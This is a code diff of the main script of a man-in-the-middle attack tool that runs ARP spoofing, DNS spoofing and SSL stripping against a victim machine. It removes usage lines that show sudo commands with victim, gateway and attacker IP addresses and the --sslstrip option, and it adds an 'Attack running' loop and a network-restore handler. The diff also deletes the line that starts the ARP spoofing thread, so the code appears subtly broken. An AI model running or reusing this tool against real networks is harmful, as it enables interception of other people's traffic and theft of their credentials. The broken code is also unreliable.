@@ -51,17 +51,13 @@ def main():
                 daemon=True
             )
             sslstrip_thread.start()
-        arp_thread.start()
 
-        # StartS:
-# Basic ARP and DNS spoofing:
-# sudo python3 main.py --victim 192.168.1.5 --gateway 192.168.1.1 --attacker 192.168.1.55
-#
-# With SSL stripping enabled:
-# sudo python3 main.py --victim 192.168.1.5 --gateway 192.168.1.1 --attacker 192.168.1.55 --sslstrip
-#
-# With specific interface for SSL stripping:
-# sudo python3 main.py --victim 192.168.1.5 --gateway 192.168.1.1 --attacker 192.168.1.55 --sslstrip --interface eth0
+        # Keep running until interrupted
+        print("[+] Attack running. Press CTRL+C to stop.")
+        while True:
+            time.sleep(1)
+
+    except KeyboardInterrupt:
         print("\n[+] Stopping ARP Spoofing. Restoring network...")
         arp.restore(args.victim, victim_mac, args.gateway, gateway_mac)
 
